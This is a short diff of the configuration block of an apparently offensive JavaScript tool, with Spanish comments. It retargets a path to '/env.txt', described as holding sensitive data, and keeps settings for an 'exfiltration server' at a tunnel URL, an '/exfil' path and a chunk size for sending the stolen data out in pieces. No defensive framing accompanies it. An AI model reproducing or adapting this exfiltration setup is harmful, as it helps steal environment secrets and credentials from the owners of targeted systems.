@@ -1,6 +1,6 @@
 // Configuración
 const CONFIG = {
-	targetUri: "./env.txt",  // URI objetivo con datos sensibles
+	targetUri: "/env.txt",  // URI objetivo con datos sensibles
 	exfilServer: "https://t-itpweb5y.tunn.dev",         // Servidor de exfiltración
 	exfilPath: "/exfil",                     // Ruta de exfiltración
 	chunkSize: 2000,                         // Tamaño de cada fragmento
